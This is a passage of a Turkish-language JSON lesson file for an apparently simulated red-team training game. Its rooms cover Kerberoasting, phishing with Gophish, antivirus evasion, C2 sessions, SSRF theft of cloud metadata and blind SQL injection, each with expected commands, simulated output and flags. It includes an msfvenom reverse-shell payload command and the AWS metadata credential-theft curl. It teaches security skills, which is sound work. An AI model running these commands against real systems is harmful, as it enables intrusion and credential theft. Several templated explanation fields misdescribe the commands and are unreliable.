        "mission": "Impacket araç setini kullanarak domaindeki SPN atanmış servis hesaplarının Kerberos biletlerini çeken komutu çalıştırın.",
        "expectedCommand": "GetUserSPNs.py corp.local/jdoe:Password123 -request",
        "acceptedCommands": [
            "GetUserSPNs.py -request",
            "python3 GetUserSPNs.py corp.local/jdoe:Password123 -request",
            "impacket-GetUserSPNs corp.local/jdoe:Password123 -request"
        ],
        "hintExplanation": "<p><strong>GetUserSPNs.py:</strong> Impacket kütüphanesinin Kerberoasting saldırısı için geliştirdiği hazır araçtır.</p>\n<p><strong>corp.local/jdoe:Password123:</strong> Ağdaki sıradan bir şirket personelinin etki alanı kullanıcı adı ve parolasıdır.</p>\n<p><strong>-request:</strong> SQL Server gibi servisler için Domain Controller'dan şifrelenmiş bilet (TGS) ister. Bu bilet bilgisayarımıza indirilir ve Hashcat ile çevrimdışı kırılarak servis yöneticisinin parolası ele geçirilir.</p>",
        "terminalSuccessOutput": "Impacket v0.11.0 - Copyright 2023 Fortra\nServicePrincipalName: MSSQLSvc/db01.corp.local:1433\nHash formatı: $krb5tgs$23$*MSSQLSvc*corp.local...\n[+] TGS BİLETİ BAŞARIYLA ÇEKİLDİ! Hashcat mod: 13100\n[FLAG] LFL{kerberoasting_tgs_ticket_captured}",
        "flag": "LFL{kerberoasting_tgs_ticket_captured}",
        "nextId": "red-302",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `GetUserSPNs.py corp.local/jdoe:Password123 -request` komutunu kullanmamızın sebebi; **Active Directory Güvenliği & Kerberoasting** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. GetUserSPNs.py: Impacket kütüphanesinin Kerberoasting saldırısı için geliştirdiği hazır araçtır. corp.local/jdoe:Password123: Ağdaki sıradan bir şirket personelinin etki alanı kullanıcı adı ve parolasıdır. -request: SQL Server gibi servisler için Domain Controller'dan şifrelenmiş bilet (TGS) ister. Bu bilet bilgisayarımıza indirilir ve Hashcat ile çevrimdışı kırılarak servis yöneticisinin parolası ele geçirilir.",
        "cmdAnatomy": [
            {
                "token": "GetUserSPNs.py",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (GetUserSPNs.py)."
            },
            {
                "token": "corp.local/jdoe:Password123",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (corp.local/jdoe:Password123)."
            },
            {
                "token": "-request",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-request)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Impacket v0.11.0 - Copyright 2023 Fortra",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "ServicePrincipalName: MSSQLSvc/db01.corp.local:1433",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Hash formatı: $krb5tgs$23$*MSSQLSvc*corp.local...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] TGS BİLETİ BAŞARIYLA ÇEKİLDİ! Hashcat mod: 13100",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "GetUserSPNs.py",
                "desc": "Active Directory Güvenliği & Kerberoasting görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `GetUserSPNs.py corp.local/jdoe:Password123 -request` komutunun temel amacı nedir?",
            "options": [
                "Impacket araç setini kullanarak domaindeki SPN atanmış servis hesaplarının Kerberos biletlerini çeken komutu çalıştırın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `GetUserSPNs.py corp.local/jdoe:Password123 -request` komutu ezbere yazılan bir kod değil; GetUserSPNs.py: Impacket kütüphanesinin Kerberoasting saldırısı için geliştirdiği hazır araçtır. corp.local/jdoe:Password123: Ağdaki sıradan bir şirket personelinin etki alanı kullanıcı adı ve parolasıdır. -request: SQL Server gibi servisler için Domain Controller'dan şifrelenmiş bilet (TGS) ister. Bu bilet bilgisayarımıza indirilir ve Hashcat ile çevrimdışı kırılarak servis yöneticisinin parolası ele geçirilir."
        }
    },
    {
        "id": "red-302",
        "track": "red",
        "title": "Sosyal Mühendislik & Kimlik Avı (Phishing)",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "SOCIAL ENGINEERING & GOPHISH",
        "theory": "### En Zayıf Halka İnsandır\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBankanın güvenlik görevlisi kılığına girip kapıdaki personele \"Sistem güncelleniyor, parolanızı şu kağıda yazın\" diyerek kimlik bilgilerini toplamaktır (Phishing).\n\nMükemmel yapılandırılmış güvenlik duvarları ve yamalanmış sunucular dahi bir personelin sahte bir bağlantıya tıklayıp parolasını girmesini engelleyemez.\n\n* **Oltalama (Phishing) Altyapısı:** Gophish gibi araçlarla şirket içi duyuru veya acil parola sıfırlama temalı senaryolar kurgulanır.\n* **İki Faktörlü Kimlik Doğrulamayı (2FA/MFA) Aşmak:** Reverse Proxy tabanlı araçlar (Evilginx2 gibi), kurban geçerli oturum açtığında üretilen oturum çerezini (Session Token) ele geçirir ve 2FA'yı baypas eder.",
        "mission": "Gophish simülasyon sunucusunun durumunu ve kampanya istatistiklerini denetleyen yönetim komutunu çalıştırın.",
        "expectedCommand": "gophish --status",
        "acceptedCommands": [
            "systemctl status gophish",
            "gophish status",
            "gophish"
        ],
        "hintExplanation": "<p><strong>gophish:</strong> Açık kaynak kurumsal phishing simülasyon yazılımıdır.</p>\n<p><strong>--status:</strong> Kampanyada kaç personele sahte e-posta gönderildiğini, kaçının bağlantıya tıkladığını ve kaçının parolasını kaptırdığını gösteren canlı panoyu ekrana getirir.</p>",
        "terminalSuccessOutput": "[GOPHISH CONTROLLER] Servis: Dinlemede (Port 3333)\nKampanya: '2026 Q4 İK Parola Güncelleme'\nGönderilen: 150 | Açılan: 98 | Tıklanan: 42 | Kimlik Veren: 19\n[FLAG] LFL{social_engineering_campaign_metrics}",
        "flag": "LFL{social_engineering_campaign_metrics}",
        "nextId": "red-303",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `gophish --status` komutunu kullanmamızın sebebi; **Sosyal Mühendislik & Kimlik Avı (Phishing)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. gophish: Açık kaynak kurumsal phishing simülasyon yazılımıdır. --status: Kampanyada kaç personele sahte e-posta gönderildiğini, kaçının bağlantıya tıkladığını ve kaçının parolasını kaptırdığını gösteren canlı panoyu ekrana getirir.",
        "cmdAnatomy": [
            {
                "token": "gophish",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (gophish)."
            },
            {
                "token": "--status",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--status)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[GOPHISH CONTROLLER] Servis: Dinlemede (Port 3333)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Kampanya: '2026 Q4 İK Parola Güncelleme'",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Gönderilen: 150 | Açılan: 98 | Tıklanan: 42 | Kimlik Veren: 19",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "gophish",
                "desc": "Sosyal Mühendislik & Kimlik Avı (Phishing) görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `gophish --status` komutunun temel amacı nedir?",
            "options": [
                "Gophish simülasyon sunucusunun durumunu ve kampanya istatistiklerini denetleyen yönetim",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `gophish --status` komutu ezbere yazılan bir kod değil; gophish: Açık kaynak kurumsal phishing simülasyon yazılımıdır. --status: Kampanyada kaç personele sahte e-posta gönderildiğini, kaçının bağlantıya tıkladığını ve kaçının parolasını kaptırdığını gösteren canlı panoyu ekrana getirir."
        }
    },
    {
        "id": "red-303",
        "track": "red",
        "title": "Savunma Sistemlerini Atlama (AV/EDR Bypass)",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "EDR BYPASS & OBFUSCATION",
        "theory": "### Tespit Edilmeden İlerlemek: EDR Bypass\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nX-Ray cihazından geçerken metal bıçağı alüminyum folyoya ve çikolata paketine sarıp (XOR Obfuscation) tarayıcının alarm vermesini engellemektir (AV/EDR Bypass).\n\nKlasik antivirüsler dosyanın SHA-256 hash'ine ve statik imzasına bakar. Modern EDR sistemleri ise belleği, API çağrılarını ve proses davranışlarını (Hooking) denetler.\n\n#### Bypass Teknikleri:\n* **Kod Karartma (Obfuscation):** Değişken isimlerini anlamsızlaştırma, stringleri XOR ile şifreleme.\n* **Direct Syscalls:** Windows API'leri güvenlik araçları tarafından dinlendiği için doğrudan çekirdeğe (kernel) syscall numarasıyla geçiş yaparak EDR'ın gözünü kör etme.",
        "mission": "Zararlı payload'ı şifreleyerek statik antivirüs imza kontrolünü baypas eden 'obfuscator.py' betiğini çalıştırın.",
        "expectedCommand": "python3 obfuscator.py payload.bin",
        "acceptedCommands": [
            "python3 obfuscator.py payload.bin -k 0xAA",
            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -f exe -o payload.exe",
            "python3 obfuscator.py"
        ],
        "hintExplanation": "<p><strong>python3 obfuscator.py:</strong> Zararlı ikili dosyanın içindeki bilinen imza kalıplarını şifreleyerek karartan araçtır.</p>\n<p><strong>payload.bin:</strong> Ham istismar kodudur. Antivirüsler dosyanın bilinen harflerini ve hash'ini tanır; XOR ile şifrelendiğinde antivirüs bunu rastgele veri sanır ve alarm vermez.</p>",
        "terminalSuccessOutput": "[+] Shellcode boyutu: 512 bayt\n[+] XOR 0xAA anahtarı ile şifrelendi.\n[+] Statik imza entropisi: 7.92 (İmza AV tarayıcılarından başarıyla gizlendi)\n[FLAG] LFL{edr_antivirus_evasion_bypass}",
        "flag": "LFL{edr_antivirus_evasion_bypass}",
        "nextId": "red-304",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `python3 obfuscator.py payload.bin` komutunu kullanmamızın sebebi; **Savunma Sistemlerini Atlama (AV/EDR Bypass)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. python3 obfuscator.py: Zararlı ikili dosyanın içindeki bilinen imza kalıplarını şifreleyerek karartan araçtır. payload.bin: Ham istismar kodudur. Antivirüsler dosyanın bilinen harflerini ve hash'ini tanır; XOR ile şifrelendiğinde antivirüs bunu rastgele veri sanır ve alarm vermez.",
        "cmdAnatomy": [
            {
                "token": "python3",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (python3)."
            },
            {
                "token": "obfuscator.py",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (obfuscator.py)."
            },
            {
                "token": "payload.bin",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (payload.bin)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] Shellcode boyutu: 512 bayt",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] XOR 0xAA anahtarı ile şifrelendi.",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Statik imza entropisi: 7.92 (İmza AV tarayıcılarından başarıyla gizl...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "python3",
                "desc": "Savunma Sistemlerini Atlama (AV/EDR Bypass) görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `python3 obfuscator.py payload.bin` komutunun temel amacı nedir?",
            "options": [
                "Zararlı payload'ı şifreleyerek statik antivirüs imza kontrolünü baypas eden 'obfuscator.py' betiğini çalıştırın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `python3 obfuscator.py payload.bin` komutu ezbere yazılan bir kod değil; python3 obfuscator.py: Zararlı ikili dosyanın içindeki bilinen imza kalıplarını şifreleyerek karartan araçtır. payload.bin: Ham istismar kodudur. Antivirüsler dosyanın bilinen harflerini ve hash'ini tanır; XOR ile şifrelendiğinde antivirüs bunu rastgele veri sanır ve alarm vermez."
        }
    },
    {
        "id": "red-304",
        "track": "red",
        "title": "Komuta Kontrol Merkezleri (C2 Frameworks)",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "C2 FRAMEWORKS & PERSISTENCE",
        "theory": "### Sızılan Sistemleri Uzaktan Yönetmek: C2 Mimarisi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEle geçirilen kalenin içine gizli bir casus yerleştirip, o casusun her 30 saniyede bir ormana sinyal göndererek \"Komutanım, yeni emriniz nedir?\" diye sormasıdır (C2 Beacon).\n\nBir sunucuya veya istemciye sızdıktan sonra sürekli orada kalmak ve güvenli iletişim kurmak için **Command and Control (C2)** yapıları kullanılır.\n\n* **Ajan (Beacon/Agent):** Hedef sistemde arka planda sessizce yaşayan programdır. Belirli aralıklarla C2 sunucusuna \"yeni görev var mı?\" diye sorar.\n* **Modern C2 Çatıları:** \n  * **Sliver:** Go tabanlı, mTLS ve DNS protokolleri üzerinden haberleşebilen güçlü açık kaynak C2.\n  * **Havoc:** Modern arayüzlü, C++ tabanlı gelişmiş Red Team frameworkü.",
        "mission": "Sliver C2 istemcisinde aktif kurban oturumlarını (sessions) listeleyen komutu girin.",
        "expectedCommand": "sliver-client sessions",
        "acceptedCommands": [
            "sessions",
            "sliver sessions",
            "sliver-client beacons",
            "sliver > sessions"
        ],
        "hintExplanation": "<p><strong>sliver-client:</strong> Red Team operasyonlarında sızılan yüzlerce bilgisayarı uzaktan tek merkezden yöneten komuta merkezi istemcisidir.</p>\n<p><strong>sessions:</strong> Hedef bilgisayarlardan komuta merkezimize gizlice bağlanan ve emir bekleyen canlı ajanların (beacon) listesini döker.</p>",
        "terminalSuccessOutput": "[*] Active sessions:\nID         Name       Transport   Remote Address       Hostname     Username\n8f12a14    beacon_w1  mtls        192.168.1.120:51221  CORP-PC01    corp\\finance_mgr\n[STATUS] C2 tüneli aktif ve şifrelenmiş.\n[FLAG] LFL{c2_framework_sliver_operations_complete}",
        "flag": "LFL{c2_framework_sliver_operations_complete}",
        "nextId": "red-305",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `sliver-client sessions` komutunu kullanmamızın sebebi; **Komuta Kontrol Merkezleri (C2 Frameworks)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. sliver-client: Red Team operasyonlarında sızılan yüzlerce bilgisayarı uzaktan tek merkezden yöneten komuta merkezi istemcisidir. sessions: Hedef bilgisayarlardan komuta merkezimize gizlice bağlanan ve emir bekleyen canlı ajanların (beacon) listesini döker.",
        "cmdAnatomy": [
            {
                "token": "sliver-client",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (sliver-client)."
            },
            {
                "token": "sessions",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (sessions)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[*] Active sessions:",
                "meaning": "İşlemin veya bağlantının **başarıyla** gerçekleştiğini doğrulayan sonuç satırıdır."
            },
            {
                "snippet": "ID         Name       Transport   Remote Address       Hostname     User...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "8f12a14    beacon_w1  mtls        192.168.1.120:51221  CORP-PC01    corp...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[STATUS] C2 tüneli aktif ve şifrelenmiş.",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "sliver-client",
                "desc": "Komuta Kontrol Merkezleri (C2 Frameworks) görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `sliver-client sessions` komutunun temel amacı nedir?",
            "options": [
                "Sliver C2 istemcisinde aktif kurban oturumlarını (sessions) listeleyen komutu girin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `sliver-client sessions` komutu ezbere yazılan bir kod değil; sliver-client: Red Team operasyonlarında sızılan yüzlerce bilgisayarı uzaktan tek merkezden yöneten komuta merkezi istemcisidir. sessions: Hedef bilgisayarlardan komuta merkezimize gizlice bağlanan ve emir bekleyen canlı ajanların (beacon) listesini döker."
        }
    },
    {
        "id": "red-305",
        "track": "red",
        "title": "Web İleri İstismar: SSRF & Bulut Metadata Sızıntısı",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "SSRF & CLOUD METADATA EXPLOIT",
        "theory": "### Sunucuyu Truva Atı Olarak Kullanmak: SSRF (Server-Side Request Forgery)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nŞirketin kapısındaki güvenlik görevlisi içeriye yabancı kimseyi almaz. Ancak şirketin kendi resmi kuryesine sonsuz güvenir. Bir saldırgan kuryenin elindeki sipariş kağıdına gizlice 'Git muhasebe odasındaki kasayı aç ve içindeki evrakı bana getir' diye yazar. Güvenlik kuryeyi durdurmaz ve saldırgan içeri girmeden kasayı soymuş olur.\n\n#### Bulut Ortamlarında SSRF Felaketi:\nAWS, Azure ve GCP gibi bulut sunucularında `169.254.169.254` adresinde sunucu kimliklerini taşıyan bir 'Link-Local Metadata' servisi çalışır. Sunucuya bu adresi çektirebilen saldırgan, geçici IAM anahtarlarını (SecretAccessKey, Token) saniyeler içinde çalar.",
        "mission": "Güvensiz proxy parametresini kullanarak AWS metadata servisinden IAM güvenlik anahtarlarını sızdırmak için curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' komutunu çalıştırın.",
        "expectedCommand": "curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        "acceptedCommands": [
            "curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            "curl \"http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
            "curl http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ],
        "hintExplanation": "<p><strong>SSRF:</strong> Sunucunun kendi iç ağına saldırgan adına istek yapmaya zorlanmasıdır.</p><p><strong>169.254.169.254:</strong> Bulut sunucularının yerel metadata IP adresidir.</p>",
        "terminalSuccessOutput": "HTTP/1.1 200 OK\n{\n  \"Code\" : \"Success\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIAZ6EXAMPLEKEY2026\",\n  \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\" : \"AQoDYXdzEJr1...\"\n}\n[KRİTİK İHLAL!] Bulut IAM geçici kimlik bilgileri sızdırıldı!\n[FLAG] LFL{red_ssrf_cloud_metadata_iam_keys_compromised}",
        "flag": "LFL{red_ssrf_cloud_metadata_iam_keys_compromised}",
        "nextId": "red-306",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'` komutunu kullanmamızın sebebi; **Web İleri İstismar: SSRF & Bulut Metadata Sızıntısı** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. SSRF: Sunucunun kendi iç ağına saldırgan adına istek yapmaya zorlanmasıdır. 169.254.169.254: Bulut sunucularının yerel metadata IP adresidir.",
        "cmdAnatomy": [
            {
                "token": "curl",
                "role": "Ana Komut (Web İstemcisi)",
                "desc": "'Client URL' kısaltmasıdır. Tarayıcı açmadan terminal üzerinden bir web sitesine bağlanıp veri veya başlık (header) çekmeye yarar."
            },
            {
                "token": "'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ('http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/')."
            }
        ],
        "outputGuide": [
            {
                "snippet": "HTTP/1.1 200 OK",
                "meaning": "İşlemin veya bağlantının **başarıyla** gerçekleştiğini doğrulayan sonuç satırıdır."
            },
            {
                "snippet": "{",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "\"Code\" : \"Success\",",
                "meaning": "İşlemin veya bağlantının **başarıyla** gerçekleştiğini doğrulayan sonuç satırıdır."
            },
            {
                "snippet": "\"Type\" : \"AWS-HMAC\",",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "169.254.169.254",
                "desc": "Bu odadaki (Web İleri İstismar: SSRF & Bulut Metadata Sızıntısı) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'` komutunun temel amacı nedir?",
            "options": [
                "Güvensiz proxy parametresini kullanarak AWS metadata servisinden IAM güvenlik anahtarlarını sızdırmak için curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `curl 'http://api.portal.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'` komutu ezbere yazılan bir kod değil; SSRF: Sunucunun kendi iç ağına saldırgan adına istek yapmaya zorlanmasıdır. 169.254.169.254: Bulut sunucularının yerel metadata IP adresidir."
        }
    },
    {
        "id": "red-306",
        "track": "red",
        "title": "SQLi İleri Düzey: Time-Based & Blind SQL Injection",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "ADVANCED BLIND SQLI",
        "theory": "### Körleme Veritabanı Sızıntısı: Ekranda Hata Yoksa Ne Yapılır?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nGözleri bağlı bir rehineye soru sorduğunuzu hayal edin. Rehine konuşamıyor ama 'Doğruysa 5 saniye bekle, yanlışsa hemen elini salla' kuralını koyuyorsunuz. Zaman tutarak rehinenden tüm şifreyi harf harf öğrenmek gibidir.\n\n#### Time-Based SQLi Mantığı:\nWeb uygulaması SQL hatasını veya sorgu çıktısını ekranda göstermez. Ancak veritabanına `IF(ASCII(SUBSTRING(password,1,1))=97, SLEEP(5), 0)` enjekte edilirse; eğer ilk harf 'a' (97) ise sunucu 5 saniye gecikmeli yanıt verir. Bu gecikme verinin doğrulandığını kanıtlar.",
        "mission": "sqlmap aracını kullanarak zaman tabanlı körleme tekniğiyle veritabanı adını çekmek için sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db komutunu çalıştırın.",
        "expectedCommand": "sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db",
        "acceptedCommands": [
            "sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db",
            "sqlmap -u \"http://target.local/item?id=1\" --technique=T --batch --current-db",
            "sqlmap -u http://target.local/item?id=1 --technique=T --batch --current-db"
        ],
        "hintExplanation": "<p><strong>--technique=T:</strong> Yalnızca Time-Based Blind (Zaman Gecikmeli) tekniğini uygular.</p><p><strong>--current-db:</strong> Aktif veritabanının adını harf harf çıkarır.</p>",
        "terminalSuccessOutput": "[*] testing connection to the target URL\n[*] confirming that parameter 'id' is dynamic\n[+] parameter 'id' is vulnerable to time-based blind SQL injection (SLEEP)\n[*] retrieved query response latency: 5.02s\ncurrent database: 'production_lfl_core'\n[BAŞARILI] Time-based blind zafiyetiyle veritabanı adı sızdırıldı!\n[FLAG] LFL{red_time_based_blind_sqli_extracted}",
        "flag": "LFL{red_time_based_blind_sqli_extracted}",
        "nextId": "red-307",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db` komutunu kullanmamızın sebebi; **SQLi İleri Düzey: Time-Based & Blind SQL Injection** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. --technique=T: Yalnızca Time-Based Blind (Zaman Gecikmeli) tekniğini uygular. --current-db: Aktif veritabanının adını harf harf çıkarır.",
        "cmdAnatomy": [
            {
                "token": "sqlmap",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (sqlmap)."
            },
            {
                "token": "-u",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-u)."
            },
            {
                "token": "'http://target.local/item?id=1'",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ('http://target.local/item?id=1')."
            },
            {
                "token": "--technique=T",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--technique=T)."
            },
            {
                "token": "--batch",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--batch)."
            },
            {
                "token": "--current-db",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--current-db)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[*] testing connection to the target URL",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] confirming that parameter 'id' is dynamic",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] parameter 'id' is vulnerable to time-based blind SQL injection (SLEEP)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
